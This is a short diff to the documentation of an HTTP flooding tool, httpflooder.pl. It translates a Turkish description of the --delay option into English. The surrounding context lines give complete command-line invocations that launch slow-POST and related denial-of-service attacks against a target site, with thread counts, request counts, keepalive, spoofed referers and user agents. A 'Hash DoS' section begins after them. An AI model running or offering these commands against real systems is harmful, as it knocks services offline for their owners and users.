@@ -83,7 +83,7 @@ bunyamin$ perl httpflooder.pl -a *SH* -h www.site.com --ips ips.txt --urls urls.
 bunyamin$ perl httpflooder.pl -a *SP* -h www.site.com --ips ips.txt --urls urls.txt --useragents useragents.txt --referers referers.txt -t 50 -n 1000 --clength 20 --delay 2 --keepalive -v 3
 
 --clength means “Content-Length”. So it will add 20 characters in POST body.
---delay her bir POST Body ekleme operasyonu için 2sn bekleme yapar.
+--delay delay value for each POST body character adding operation.
 
 ===Hash DoS===
 
